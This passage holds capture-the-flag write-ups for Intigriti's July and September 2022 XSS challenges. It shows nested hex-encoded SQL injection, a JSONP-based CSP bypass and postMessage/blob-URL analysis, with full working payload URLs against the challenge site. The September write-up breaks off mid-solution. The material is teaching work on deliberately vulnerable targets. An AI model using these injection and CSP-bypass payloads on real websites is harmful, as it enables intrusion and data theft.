https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,'<img/src/onerror=alert(1)>',3,4,5
```

Eagerly we expect the post title to render into an image tag with on onerror handler
that pops and proofs we have found an XSS vulnerability.

But what's that, a `error`!

We know it's valid query syntax with the correct number of columns in the union select.
Some kind of additional checks or filtering must be going on that prohibits our payload.

We try a simpler string.
```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,'hello',3,4,5
error
```
So the xss payload was not the problem. We minimize it further.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,'',3,4,5
error
```
The `''` seem to be the problem. In our mental model this still is valid syntax
which begs the question if the single `'` we initially used to quickly check
for SQLi was actually erroring because of bad syntax or some kind of filter.

Weirdly enough there is no error if the `'` is within a mysql comment

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1/*'*/,2,3,4,5
```

This tells us the filtering can't be a simple check for quotes in the get parameter.
Something else must be going on. But for now let's not get hung up on this. Let's work
around this little shock in our assumption. There sure have to be other ways
to create strings in mysql without quotes. OK google! "mysql string functions",
comes up with this.
```
CHAR() 	Return the character for each integer passed 
```

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,char(65,65,65),3,4,5
AAA
```
Great this works. 65 is the decimal for ASCII character A. By reading the mysql
manual we also come across the version function. We quickly check the database
version, just for fun.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,version(),3,4,5
8.0.29
```
Some more reading and we find another, shorter way than using the char() function
for encoding our payload. Simply by using the hexadecimal (0x) representation.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,0x414141,3,4,5
AAA
```

We use this online tool https://www.convertstring.com/EncodeDecode/HexEncode to convert your
XSS payload `<img/src/onerror=alert(1)>` to hex `0x3C696D672F7372632F6F6E6572726F723D616C6572742831293E`


```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,0x3C696D672F7372632F6F6E6572726F723D616C6572742831293E,3,4,5
```

And we see our payload! But wait, that's a problem. No popup. We see it which means
it did not get rendered into an actual image tag.

Checking the source of the website quickly tells us why.

```
<h2 class="blog-post-title">&lt;img/src/onerror=alert(1)&gt;</h2>
```

There is additional sanitation going on. The `<` and `>` got converted into `&lt;` and `&gt;`.
This is a problem for us. It will make any HTML tag injection impossible.

Maybe the sanitation is not in place in the other spots. We try to inject the payload
into all the places.


```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999%20union%20select%201,0x3C696D672F7372632F6F6E6572726F723D616C6572742831293E,0x3C696D672F7372632F6F6E6572726F723D616C6572742831293E,4,0x3C696D672F7372632F6F6E6572726F723D616C6572742831293E
```

Bummer! In the rendering process the input for title, date and post content all got properly sanitized.
But what about the author name? Maybe that value gets rendered differently. 
But where was the author in all our tests anyway, it never showed up. That's 
interesting and as we hit a dead end with the other fields worth investigating.

We know from looking at the regular response from an archive link we see on the site,

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=2
```
that every blog article not only has a title, creation date, post but also a 
author name, like Jake or Anton.

We saw from our request with the value ```9999 union select 1,2,3,4,5``` that 
column `2` represents the title, `5` creation date and `3` the post content. 
This leaves column `1` or `4` for the author. But why is the integer `1` or `4`
not shown in the spot where we would expect the author name to appear?

Maybe the code does not expect a number to be the author name and somehow fails.
But we tried sending an hex encoded string and that didn't work either.

Could it be that the author name is actually stored a different table? 
This would not be an unusual DB layout. Have one table eg. `authors` with columns
like `id`, `firstname`, `lastname`. And then one table `posts` in which you just store a pointer author `id` to an entry in the `authors` table.  This would mean that the first query returns some data plus author `id` and then uses that id to retrieve, with a second query the firstname like `Anton` from `authors`.  And if the `id` is one that is not present in the `authors` table it returns no entries. This could explain why there is nothing rendered. Are we providing the wrong id? And if there is a second query, is that also prone to SQLi?  We don't know what the correct author ids are and they don't even really matter but let's just quickly check if they are easily guessable. We know two authors exist.  `Jake` and `Anton`. Id `0` and `1` or `1` and `2` would make sense? We already know what the columns `2`,`4`,`5` stand for, let's put the integer `0` into column
`1` and `4` and test our theory about the second query.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 0,1337,1337,0,1337
```
Nope, still nothing. Let's repeat with `1`.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,1337,1337,1,1337
```
Hello `Anton`! Looks like there is indeed a second query happening.
Last thing, to check which column is the author id.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,1337,1337,1337,1337
```
It's column `4`. If `Anton` has id `1` maybe `Jake` has id `2`

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 0,0,0,2,0
```
Correct. As id `2` is used for a second query it will probably again be susceptible 
to SQL injection. Let's try first with some logic injection again.

`999 or true` returns alls rows and will probably then show the first name.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 0,0,0,999 or true,0
```

Right,`Anton` shows up. Now `999 or false` will show nothing.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 0,0,0,999 or false,0
```
Oh?! What's that. Again `Anton`. Something is wrong here. We realize that we 
will have to be careful. We don't want the `999 or false` be evaluated in
the first injection but in the second. Best to pass it as a simple string into
the second. As we can't use `"` or `'` we will fallback on the hex encoding.

`999 or false` in hex is `0x393939206F722066616C7365`.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 0,0,0,0x393939206F722066616C7365,0
```
Empty, nice. Now it really works. We now have to do the same thing like before.
Figure out how many columns the second query returns to construct a valid
`union select`. But this time every time hex encoded.

```
0 union select 1      => 0x3020756E696F6E2073656C6563742031 
0 union select 1,2    => 0x3020756E696F6E2073656C65637420312C32
0 union select 1,2,3  => 0x3020756E696F6E2073656C65637420312C322C33

https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999%20union%20select%200,0,0,0x3020756E696F6E2073656C65637420312C322C33,0
```
And bingo. After checking `3` times we see the integer `2` appear in the 
place of the author name. We know learned the second SQL query returns `3` columns and
the author is expected in the `2` place.

Let's place a string in the `2` column and see if we can inject an author.
```
0 union select 1,"h43z",3 => 0x3020756E696F6E2073656C65637420312C226834337A222C33
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999%20union%20select%200,0,0,0x3020756E696F6E2073656C65637420312C226834337A222C33,0
```
Empty!? Where has our injected author `h43z` gone? We remember, we have to be 
careful. This is like Incecption, the movie. We are preparing our sql injection already
within an injection. The encoding get's peeled away after the first query and
then we again have an `"` in there which we know does the application not like.

To fix this we will have to encode the string first. Place it then in the second
injection, encode that whole thing again.

```
h43z   => 0x6834337A
0 union select 1,0x6834337A,3 => 0x3020756E696F6E2073656C65637420312C307836383334333337412C33
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999%20union%20select%200,0,0,0x3020756E696F6E2073656C65637420312C307836383334333337412C33,0
```

Awesome! We injected an custom author string. Let's replace it with an actual
xss payload.

```
<img/src/onerror=alert(1>   
=> 0x3C696D672F7372632F6F6E6572726F723D616C65727428313E

0 union select 1,0x3C696D672F7372632F6F6E6572726F723D616C65727428313E,3 
=> 0x3020756E696F6E2073656C65637420312C307833433639364436373246373337323633324636463645363537323732364637323344363136433635373237343238333133452C33

https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999%20union%20select%200,0,0,0x3020756E696F6E2073656C65637420312C307833433639364436373246373337323633324636463645363537323732364637323344363136433635373237343238333133452C33,0

```
Still no popup?!! We check the source code. And see this.
```
<p class="blog-post-meta">0 by 
  <a href="#">
    <img src="" onerror="alert(1">
  </a>
</p>
```
The rendering into an actual image tag worked. So what's going on. Let's open
the dev tools.

```
Refused to execute inline event handler because it violates the following Content Security Policy directive: "default-src 'self' *.googleapis.com *.gstatic.com *.cloudflare.com". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution. Note that hashes do not apply to event handlers, style attributes and javascript: navigations unless the 'unsafe-hashes' keyword is present. Note also that 'script-src' was not explicitly set, so 'default-src' is used as a fallback.
```
No we understand why no onerror handler was triggered. The website has a CSP that
prohibits any inline execution.

If we look for the actual http header in the response of the server we see the
full policy.

```
content-security-policy
	default-src 'self' *.googleapis.com *.gstatic.com *.cloudflare.com
```

Only `<scripts>` with a src from the domain self meaning `challenge-0722.intigriti.io`, 
`*.googleapis.com`, `*.gstatic.com` or `*.cloudflare.com` are allowed to execute.

So after all the work we already put in we will still have to find a CSP bypass
to proof XSS.

Let's check if google has any tips for us how to do that.
We use `https://csp-evaluator.withgoogle.com/` to check the CSP for insecure settings.
```
*.googleapis.com
    ajax.googleapis.com is known to host JSONP endpoints and Angular libraries which allow to bypass this CSP.
    ajax.googleapis.com is known to host Flash files which allow to bypass this CSP.


*.gstatic.com
    www.gstatic.com is known to host Angular libraries which allow to bypass this CSP.


*.cloudflare.com
    cdnjs.cloudflare.com is known to host Angular libraries which allow to bypass this CSP.
```

All 3 domains are actually CDNs, they host javascript libraries.
Unfortunately these are not public CDNs where we could upload our own javascript code.
You will only find big, popular, well maintained js libraries. But as the 
validator already points out those websites often host old versions of libraries 
like Angular which may have some vulnerabilities on it's own in it.

This website proofed to be a good resource
```
https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
```

After some trial and error we concluded that many vulnerabilities in existing 
libraries had their own short comings and we couldn't get them to work.

Fortunately googleapis.com used to have a lot of JSONP endpoints and some are still
active. A JSONP endpoint from a whitelisted domain means CSP bypass. But we have
to find one. After going through some google results for `googleapis jsonp`, `googleapis.com csp` and
encountering many that don't work anymore, we do the same searches on github.
Then repeat again on twitter until we finally hit the jackpot.

Someone already found and tweeted about this public endpoint where you can
provide a custom callback name.
```
www.googleapis.com/customsearch/v1?callback=alert(1)

// API callback
alert(1)({
  "error": {
    "code": 403,
    "message": "SSL is required to perform this operation.",
    "errors": [
      {
        "message": "SSL is required to perform this operation.",
        "domain": "global",
        "reason": "sslRequired"
      }
    ],
    "status": "PERMISSION_DENIED"
  }
}
);

```

If we inject this script tag

```
<script src="www.googleapis.com/customsearch/v1?callback=alert(document.domain)"></script>
```

we no longer violate the CSP and can finally trigger javascript to proof XSS.
Last steps!

```
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)"></script>
=> 0x3C736372697074207372633D2268747470733A2F2F7777772E676F6F676C65617069732E636F6D2F637573746F6D7365617263682F76313F63616C6C6261636B3D616C65727428646F63756D656E742E646F6D61696E29223E3C2F7363726970743E0A

0 union select 1,0x3C736372697074207372633D2268747470733A2F2F7777772E676F6F676C65617069732E636F6D2F637573746F6D7365617263682F76313F63616C6C6261636B3D616C65727428646F63756D656E742E646F6D61696E29223E3C2F7363726970743E0A,3
=> 0x3020756E696F6E2073656C65637420312C30783343373336333732363937303734323037333732363333443232363837343734373037333341324632463737373737373245363736463646363736433635363137303639373332453633364636443246363337353733373436463644373336353631373236333638324637363331334636333631364336433632363136333642334436313643363537323734323836343646363337353644363536453734324536343646364436313639364532393232334533433246373336333732363937303734334530412C33

https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999%20union%20select%200,0,0,0x3020756E696F6E2073656C65637420312C30783343373336333732363937303734323037333732363333443232363837343734373037333341324632463737373737373245363736463646363736433635363137303639373332453633364636443246363337353733373436463644373336353631373236333638324637363331334636333631364336433632363136333642334436313643363537323734323836343646363337353644363536453734324536343646364436313639364532393232334533433246373336333732363937303734334530412C33,0
```

And that's how we solved the 2022 Intigrity July Challenge.

Follow me on [twitter.com/h43z](https://twitter.com) for more fun, exploration! Or mention @h43z to ask questions.



### File: writeups/0922-intigriti.md

# Intigrity September 2022 Challenge
###### Follow [@h43z](https://twitter.com/h43z) for more.

```
For best learning effect always try to solve on your own first! 
If you hit a dead end, 
read writeup until you get a new idea on how to proceed and stop reading further. 
Repeat until successful solve.
```

https://challenge-0922.intigriti.io/

What does the website do? There is just one `<input>` field where you can enter text.
On `ENTER` or on clicking 🔮 the Magic 8 Ball will tell you
some answer to your input (question).

Let's check the code. We see that that `magic.php` is embedded as an iframe.
```
<iframe id="ball" src="https://challenge-0922.intigriti.io/challenge/magic.php" sandbox="allow-scripts allow-same-origin"></iframe>
```
This iframe will receive a message, the input value via `postMessage` with the 
`buttonClick()` function that get's triggered on submission.
```
if (document.querySelector('#question').value){
        document.querySelector('#ball').contentWindow.postMessage({
          question: document.querySelector('#question').value
        }, '*');
      }
```
Now onto `magic.php`. What does it do when it receives a message from `postMessage`.
```
addEventListener('message', e => {
  if ('question' in Object(e.data)){
    fetch('https://challenge-0922.intigriti.io/challenge/api.php?question=' + encodeURIComponent(e.data.question))
      .then(e => e.text())
      .then(e => {
        let resp;
        try{
          resp = JSON.parse(e);
        } catch (_) {
          resp = eval(e);
        }
        shake(resp);
    });
```
It makes another request to `https://challenge-0922.intigriti.io/challenge/api.php?question=`
Then tries to `JSON.parse()` the response of the endpoint and if the parsing throws an error
the response get's passed to `eval`... 

This screams to be investigated. Maybe we can influence the response somehow 
to include a payload from us.

What does this endpoint return? We open it in the browser and provide just
some random value to the `question` parameter.

`https://challenge-0922.intigriti.io/challenge/api.php?question=asdf`
```
{"answer":"Signs point to yes"}
```
Okay. Doesn't seem to be anything reflected here of interest. This will get parsed
via 'JSON.parse' just fine and never reach the `eval(e)`.

We should mess with the `question` parameter value for a bit. Maybe some value
will lead to a more interesting response A too long string, a number, too big number, special character?
Basically anything that could break the server side code that generates the response.

We try a few values.
```
https://challenge-0922.intigriti.io/challenge/api.php?question=99999999999999999999999
https://challenge-0922.intigriti.io/challenge/api.php?question=-99999999999999999999999
https://challenge-0922.intigriti.io/challenge/api.php?question=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
https://challenge-0922.intigriti.io/challenge/api.php?question='
https://challenge-0922.intigriti.io/challenge/api.php?question="

https://challenge-0922.intigriti.io/challenge/api.php?question=0
https://challenge-0922.intigriti.io/challenge/api.php?question
https://challenge-0922.intigriti.io/challenge/api.php?question[]=bbbbbbbb
```
The last 3 look promising. Sending a `0` gives us
```
## Exception 'Question not found'

#0 /dev/urandom(856294826): setQuestion('"0"')
#1 /dev/urandom(1665290270): initAnonConfig('he2qj4nbcchvcf9md40pnfp28m', 'eyJhdHJhbE9iamVjdCI6WzYwMzA4MzMxOCwyMDEwNzkyMTU0LDE1NjMzMzQ4ODMsMTQ0MTIwMjQ2LDE1NDg5NzYyMTMsMjA1MjcwNTY5MiwxMzU5NjUxOTYwLDczMTI0ODg2MiwxNDg1OTMzODUzLDczNjc2NjA3Ml0sImNzcCI6IjU2NTRlMzFkNWZmMzM4M2MyMDE1Mjg5ZDYwNzEwOWEzIiwidXJhbmRvbUNvbnNpc3RlbmNlIjpbMTIzNzM2OTg3MywxODU5OTg5MjY0LDYxNzYzMjYxNiwzODg5MjQ0NTEsOTI4ODYyNTU0LDY4MTA1ODI5NCwxNTM4MDc4NDExLDExMzQ2NTc5MjEsMTgzNTM2MzQ1NSw5MDk3OTYwMjFdfQ==')
#2 /dev/urandom(1673362906): initAstralBall('eyJhbnN3ZXJzIjpbIkl0IGlzIGNlcnRhaW4iLCJXaXRob3V0IGEgZG91YnQiLCJEZWZpbml0ZWx5IiwiTW9zdCBsaWtlbHkiLCJPdXRsb29rIGdvb2QiLCJZZXMhIiwiVHJ5IGFnYWluIiwiUmVwbHkgaGF6eSIsIkNhbid0IHByZWRpY3QiLCJObyEiLCJVbmxpa2VseSIsIlNvdXJjZXMgc2F5IG5vIiwiVmVyeSBkb3VidGZ1bCJdfQ==', '"0"')
#3 /var/www/html/api.php(18): require_once('/dev/urandom')
```

Not providing any value for `question` shows 
```
## Exception 'Question not found'

#0 /dev/urandom(1078983387): setQuestion('null')
#1 /dev/urandom(300753660): initAnonConfig('he2qj4nbcchvcf9md40pnfp28m', 'eyJhdHJhbE9iamVjdCI6WzYwMzA4MzMxOCwyMDEwNzkyMTU0LDE1NjMzMzQ4ODMsMTQ0MTIwMjQ2LDE1NDg5NzYyMTMsMjA1MjcwNTY5MiwxMzU5NjUxOTYwLDczMTI0ODg2MiwxNDg1OTMzODUzLDczNjc2NjA3Ml0sImNzcCI6IjU2NTRlMzFkNWZmMzM4M2MyMDE1Mjg5ZDYwNzEwOWEzIiwidXJhbmRvbUNvbnNpc3RlbmNlIjpbMTIzNzM2OTg3MywxODU5OTg5MjY0LDYxNzYzMjYxNiwzODg5MjQ0NTEsOTI4ODYyNTU0LDY4MTA1ODI5NCwxNTM4MDc4NDExLDExMzQ2NTc5MjEsMTgzNTM2MzQ1NSw5MDk3OTYwMjFdfQ==')
#2 /dev/urandom(281386763): initAstralBall('eyJhbnN3ZXJzIjpbIkl0IGlzIGNlcnRhaW4iLCJXaXRob3V0IGEgZG91YnQiLCJEZWZpbml0ZWx5IiwiTW9zdCBsaWtlbHkiLCJPdXRsb29rIGdvb2QiLCJZZXMhIiwiVHJ5IGFnYWluIiwiUmVwbHkgaGF6eSIsIkNhbid0IHByZWRpY3QiLCJObyEiLCJVbmxpa2VseSIsIlNvdXJjZXMgc2F5IG5vIiwiVmVyeSBkb3VidGZ1bCJdfQ==', 'null')
#3 /var/www/html/api.php(18): require_once('/dev/urandom')
```

And providing an Array returns
```
## Exception 'Question not found'

#0 /dev/urandom(1707739064): setQuestion('["aaaaaaaa"]')
#1 /dev/urandom(903026658): initAnonConfig('he2qj4nbcchvcf9md40pnfp28m', 'eyJhdHJhbE9iamVjdCI6WzYwMzA4MzMxOCwyMDEwNzkyMTU0LDE1NjMzMzQ4ODMsMTQ0MTIwMjQ2LDE1NDg5NzYyMTMsMjA1MjcwNTY5MiwxMzU5NjUxOTYwLDczMTI0ODg2MiwxNDg1OTMzODUzLDczNjc2NjA3Ml0sImNzcCI6IjU2NTRlMzFkNWZmMzM4M2MyMDE1Mjg5ZDYwNzEwOWEzIiwidXJhbmRvbUNvbnNpc3RlbmNlIjpbMTIzNzM2OTg3MywxODU5OTg5MjY0LDYxNzYzMjYxNiwzODg5MjQ0NTEsOTI4ODYyNTU0LDY4MTA1ODI5NCwxNTM4MDc4NDExLDExMzQ2NTc5MjEsMTgzNTM2MzQ1NSw5MDk3OTYwMjFdfQ==')
#2 /dev/urandom(626561804): initAstralBall('eyJhbnN3ZXJzIjpbIkl0IGlzIGNlcnRhaW4iLCJXaXRob3V0IGEgZG91YnQiLCJEZWZpbml0ZWx5IiwiTW9zdCBsaWtlbHkiLCJPdXRsb29rIGdvb2QiLCJZZXMhIiwiVHJ5IGFnYWluIiwiUmVwbHkgaGF6eSIsIkNhbid0IHByZWRpY3QiLCJObyEiLCJVbmxpa2VseSIsIlNvdXJjZXMgc2F5IG5vIiwiVmVyeSBkb3VidGZ1bCJdfQ==', '["aaaaaaaa"]')
#3 /var/www/html/api.php(18): require_once('/dev/urandom')
```

In all three cases we seem to be getting some kind of trace and debug output with lines
from the actual php code which has a lot of base64 encoded stuff in there.

If you decode the base64 strings we will see it's a JSON object. 
The second argument to the `initAnonConfig` function
has a key with `csp' and the value of `46512fdd35b5ad382767954b3f0c6f1e` in it. We
should remember this, it could potentially become useful later on.
```
{
  "atralObject": [
    2204892,
    623736226,
    2142579215,
    1966761445,
    1519093412,
    2112201876,
    2028747074,
    1792179292,
    803288202,
    789667990
  ],
  "csp": "46512fdd35b5ad382767954b3f0c6f1e",
  "urandomConsistence": [
    1243189873,
    1884983223,
    1794837626,
    1695932971,
    416092641,
    1195114699,
    2032810105,
    1246950332,
    1250924323,
    960103501
  ]
}
```

The full trace and debug response output is not going to be parsed correctly
into correct `JSON`. The `JSON.parse` call will throw an error and the response will get
passed to `eval`.

Although with the method of providing an Array `?question[]=aaaaaaaa` we are even able to
include some by us controlled characters, as they will show up in the response at 
`...setQuestion('["aaaaaaaa"]')...`, the  whole thing ain't javascript. 
And there is nothing we can do to turn it into valid javascript code.

```
eval(`## Exception 'Question not found'

#0 /dev/urandom(1707739064): setQuestion('["aaaaaaaa"]') ...`)

```
Will always throw

```
Uncaught SyntaxError: '#' not followed by identifier
```

No matter what we inject we can't change the fact that the response starts
with `## Exception...`. This will forever be a syntax error when passed to
`eval`.

It seems this `eval` in the code is a trap and dead end in the challenge.

The page continues with calling the function `shake()` with the parsed response.
```
  try{
    resp = JSON.parse(e);
  } catch (_) {
    resp = eval(e);
  }
  shake(resp);
```
That function then sends back data which seem to be some kind of action instructions 
to the `top` which in the regular case is the `index.php` page. 
```
top.postMessage({
  action: 'set',
  element: '#ball',
  attr: 'style',
  value: 'left: ' + rand() + 'px; top: ' + rand() + 'px;'
}, '*');
} else {
top.postMessage({
  action: 'result',
  value: resp.answer
}, '*');
 ```

Using `top` here is kind of a bug, it should instead be `parent`. 
Because if for example the challenge `index.php`
itself was within an iframe, this `magic.php` would
send the message to the uppermost `top` and not the `index.php`.

For us this misuse of `top` vs `parent` has no real meaning as there is nothing interesting gained from
receiving those messages.

Aside from the `eval` in `magic.php` there is only one other place that somehow interacts
and manipulates the webpage. It's `onmessage` listener in the main page `index.php`.
```
addEventListener('message', e => {
  switch(e.data.action){
    case 'set':
      [...document.querySelectorAll(e.data.element)].forEach(s => s.setAttribute(e.data.attr, e.data.value));
      break;
    case 'delete':
      [...document.querySelectorAll(e.data.element)].forEach(s => s.removeAttribute(e.data.attr, e.data.value));
      break;
    case 'get':
      [...document.querySelectorAll(e.data.element)].forEach(s => s.getAttribute(e.data.attr, e.data.value));
      break;
    case 'count':
      [...document.querySelectorAll(e.data.element)].length;
      break;
    case 'result':
      document.querySelector('#answer').innerHTML = e.data.value.replace(/<|>/g,'');
      break;
    default:
      console.log(e.data);
  }
});
```
Looking promising is the action 'result' that manipulates `innerHTML` of a tag
with the id of `answer`. But before that it also sanitizes whatever it's placing
there by removing '>' and '<'. Those two characters are crucial for any tag
injection with an event handler like the classic `<img/src/onerror=alert(1)>`.
Without `<` and `>` it's just becomes a textnode `img/src/onerror=alert(1)` and totally
useless.

This simple character filter seems robust `.replace(/<|>/g,'')` Not much wiggle room.
No way to trick this.

The other sections of this code where DOM manipulation is taking place is
when it receives the action `set` and then runs `setAttribute` and `delete` with `removeAttribute`.
Two functions that let you set and remove any attribute from a tag.

Reminder how a html tag looks like  `<tag attribute=value></tag>`.

Fun fact `removeAttribute` only expects one parameter. In `s.removeAttribute(e.data.attr, e.data.value)`
the second will not get used. Another bug with zero impact though.

Setting an attribute could help us with the `innerHTML` from the result action.
```
  document.querySelector('#answer').innerHTML = e.data.value.replace(/<|>/g,'');
```
Right now the HTML tag with the id of `answer` within the challenge site
is an h1 tag `<h1 id="answer" class="text-light">`.

But if there was a `<script>` tag with an id of `answer` then one could indeed 
inject code into it. Without even the need for '>' or '<', `innerHTML` would simply 
change the javascript code of the tag.

How would we change any `<script>` tag with to have the id of `answer`? We would make use of
the `setAttribute` of the set action and just set it ourselves. 
But it would have to be a `<script>` that comes before the `<h1>` because
`document.querySelector('#answer')` only returns one and the first html element on the
page that it finds.

Before we continue with this idea let's do a quick proof of concept on how
the `innerHTML` behaves on `script` tags.
Here a short simulation of the situation we are in.

```
<html>

  <script id=answer></script>

  <script>
    document.querySelector('#answer').innerHTML = 'alert(1)'
  </script>

</html>
```
As you can see here https://editor.43z.one/xhs82 this would indeed pop an alert.


The only problem is that the script tag we would work with is this one from the
challenge site.

```
</head>
<body>
  <script nonce="46512fdd35b5ad382767954b3f0c6f1e">
    fetch('https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.2.0/css/bootstrap.min.css')
    ....
  </script>
```
Would changing the `innerHTML` still work if the `<script>` tag is not empty?
We test it by changing our little proof of concept. https://editor.43z.one/bru59 
```
<html>

  <script id=answer>
    console.log(8)
  </script>

  <script>
    document.querySelector('#answer').innerHTML = 'alert(1)'
  </script>

</html>
```
Unfortunately it doesn't. No `alert` is 
executed. It just runs the `console.log(8)`. This `innerHTML` path 
will not work in our case.

It's starting to look like, whatever the solution to this challenge is it must be solvable 
by utilizing `setAttribte` and/or `removeAttribute`. And those two 
functions must be acting on some of the html tags already present in the page 
as there is no way to add new ones.

The list of interesting tags already present in the page is short. It's
`<iframe>` and `<script>`. By the way, beforehand we forgot to test the obvious thing first.
Changing the `src` attribute on the `script` tag. We maybe suspect now that it will
be similar to the `innerHTML` situation. Dynamically changing the content will
only work if it's empty in the first place. But it's always better to check!

```
<html>
  <script></script>
  <script>
    document.querySelector('script').src = 'https://f.43z.one/a.js'
  </script>
</html>
```
When it's empty, it works.

```
<html>
  <script>/*just a js comment*/</script>
  <script>
    document.querySelector('script').src = 'https://f.43z.one/a.js'
  </script>
</html>
```
If it's not empty, it doesn't. But hey, we checked!

The `<iframe>` is the last interesting tag left. Reading through it's MDN page
https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe the most interesting
attributes seem to be `src` and `srcdoc`. Both let you control the actual content of the 
`iframe`.

Maybe this is a good point to do a reality check before we continue exploring.
So far we run on a few assumptions which is fine but let's make sure we can fulfill
them.

The big one was that we were even able to reach this part of the code somehow.
```
addEventListener('message', e => {
  switch(e.data.action){
    case 'set':
      [...document.querySelectorAll(e.data.element)].forEach(s => s.setAttribute(e.data.attr, e.data.value));
      break;
    case 'delete':
      [...document.querySelectorAll(e.data.element)].forEach(s => s.removeAttribute(e.data.attr, e.data.value));
      break;
    case 'get':
      [...document.querySelectorAll(e.data.element)].forEach(s => s.getAttribute(e.data.attr, e.data.value));
      break;
    case 'count':
      [...document.querySelectorAll(e.data.element)].length;
      break;
    case 'result':
      document.querySelector('#answer').innerHTML = e.data.value.replace(/<|>/g,'');
      break;
    default:
      console.log(e.data);
  }
});
```

How would we as attackers trigger any of those cases. The messages come from the
`magic.php` page. But what's important to realize is that any page can send another page
messages as long as it has a window reference of the receiver.

And how do you get such a reference you might ask. Two ways, either use the
javascript `open` function like  `winref = open('//challenge-0922.intigriti.io')` or
embed the page in an `iframe`.

We will do the latter.
```
<iframe id=i src="https://challenge-0922.intigriti.io"></iframe>
<script>
  // document.querySelector('iframe').contentWindow 
  // document.getElementById('i').contentWindow
  // window.i.contentWindow
  // window.frames[0]
  // i.contentWindow 
  // frames[0]
  // all now hold a window reference to the embedded page
</script>
```
Now we can now use `postMessage` to send it any message.
```
<iframe onload=run() src="https://challenge-0922.intigriti.io"></iframe>
<script>
  run = e => {
    // the iframe onload event is not enough to make sure that
    // the embedded iframe has finished loading it's javascript listeners
    // To be extra sure we will wait for another 100 milliseconds before
    // we send a message
    setTimeout(_ => frames[0].postMessage('hello', '*'), 100)
  }
</script>
```
But the challenge has a check in place to make sure it's only processing messages
coming from what it considers the right place, the `magic.php` page.
You will find in the `index.php` this code.

```
window.addEventListener('message', e => {
  if (e.source !== document.querySelector('#ball').contentWindow){
    e.stopImmediatePropagation();
  }
});
```
That event listener above is registered before the one we want to get at and
is therefore executed first. It probes if the `source` of the incoming message is not the window that is 
`document.querySelector('#ball').contentWindow`, the  `magic.php`
`iframe`. If that is the case it will stop the event propagation immediately. 
And our messages send from outside will never reach the other `onmessage` listener
with the `setAttribute` and `removeAttribute`.
Not until we make sure that `e.source == document.querySelector('#ball').contentWindow`.

Good thing is that cross origin sites can actually change the location of iframes.
That's pretty much the only thing a cross origin site can do to other sites.
It can't read what the location of an `iframe` is but it can set it.

Here we try to `console.log` the `magic.php` iframe's location. See https://editor.43z.one/413rf
```
<iframe onload=run() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
<script>
  // frames[0]     // is the iframe above
  // frames[0][0]  // is iframe within above iframe, so `magic.php`
  run = e => console.log(frames[0][0].location.href)
</script>
```
We get `Uncaught DOMException: Permission denied to get property "href" on cross-origin object`
The domain, in this case `editor.43z.one` (this is from where we run all our tests)
is not allowed to access properties of iframes that are on other 
domains. That's a fundamental security mechanism of browsers, it's called the
Same-Origin-Policy.

BUT we can change the location! Without ever reading it.
```
<iframe onload=run() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
<script>
  run = e => frames[0][0].location = 'https://google.com'
</script>
```
Or can't we because we get `Content Security Policy: The page’s settings blocked the loading of a resource at https://google.com/ (“default-src”).`
We theoretically could but in this case the application makes use of another but this time optional security mechanism, the
Content Security Policy.

This policy is set in the `meta` tag of the challenge page.
```
<meta http-equiv="Content-Security-Policy" content="default-src 'self' blob: 'unsafe-inline' challenge-0922.intigriti.io; script-src 'nonce-46512fdd35b5ad382767954b3f0c6f1e'; connect-src https:; object-src 'none'; base-uri 'none';">
```
For best understating read the documentation at
https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

Let's have a quick look at the CSP in place. 
```
default-src 'self' blob: 'unsafe-inline' challenge-0922.intigriti.io; 

script-src 'nonce-46512fdd35b5ad382767954b3f0c6f1e';
connect-src https:; 
object-src 'none';
base-uri 'none';
```
It tells us that `<scripts>` are only allowed to load if they have a nonce of attribute of `46512fdd35b5ad382767954b3f0c6f1e`.
But what about an `<iframe>`? It does not mention the `frame-src` directive so
the fallback will become `default-src`.

There it says `self` meaning the same origin as the app. `challenge-0922.intigriti.io` which again is like self.
`unsafe-inline`, unclear what that would mean in the contenxt of `frame-src`.
And then `blob:`. This one is very interesting because we as attackers can create
blob URLs. It's as simple as.
```
  blobUrl = URL.createObjectURL(new Blob(['<h1>hello</h1><script>alert(1)<\/script>'], {type : 'text/html'}))
  console.log(blobUrl)
```
And depending on from which context this was run in you will get an URL looking similar to 
`blob:null/f38316a2-5232-4414-9bd2-1be6f65e2226`

If we would open this URL we would see a big "hello" and an alert popup.
The browser itself created this file internally. And that's why only the 
browser window that created the URL can open it.

Wait a second! We can finally inject arbitrary javascript! Did we solve
the challenge?

```
